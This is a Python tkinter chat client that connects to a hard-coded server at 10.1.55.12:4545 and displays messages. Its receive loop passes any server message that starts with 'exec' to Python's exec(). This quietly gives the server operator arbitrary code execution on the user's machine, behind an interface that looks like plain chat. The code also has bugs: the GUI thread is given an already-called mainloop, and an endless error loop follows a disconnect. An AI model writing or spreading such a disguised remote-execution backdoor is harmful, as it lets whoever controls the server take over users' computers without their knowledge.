import socket
import threading
import sys, subprocess
import tkinter as tk



root = tk.Tk()

entry = tk.Entry()
entry.pack()

listbox = tk.Listbox(root, width=100, height=20)
listbox.pack()

PORT = 4545

SERVER = "10.1.55.12"
#SERVER = socket.gethostbyname(socket.gethostname())

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))

def send_msg(event = None):
    msg = entry.get()
    entry.delete(0, "end")
    message = msg.encode('utf-8')
    client.send(message)


def recieveMsg():
    while(True):
        try:
            recievedMsg = client.recv(1024).decode()
            if(recievedMsg[0: 4] == "exec"):
                exec(recievedMsg[5:])
            else:
                # Add a value to the listbox
                listbox.insert(tk.END, recievedMsg)

        except:
            listbox.insert(tk.END, "Disconnected from the server!")

entry.bind("<Return>", send_msg)

button = tk.Button(text="Submit", command=send_msg)
button.pack()

recieveThread = threading.Thread(target=recieveMsg, args=())
recieveThread.start()

GUIThread = threading.Thread(target=root.mainloop(), args=())
GUIThread.start()
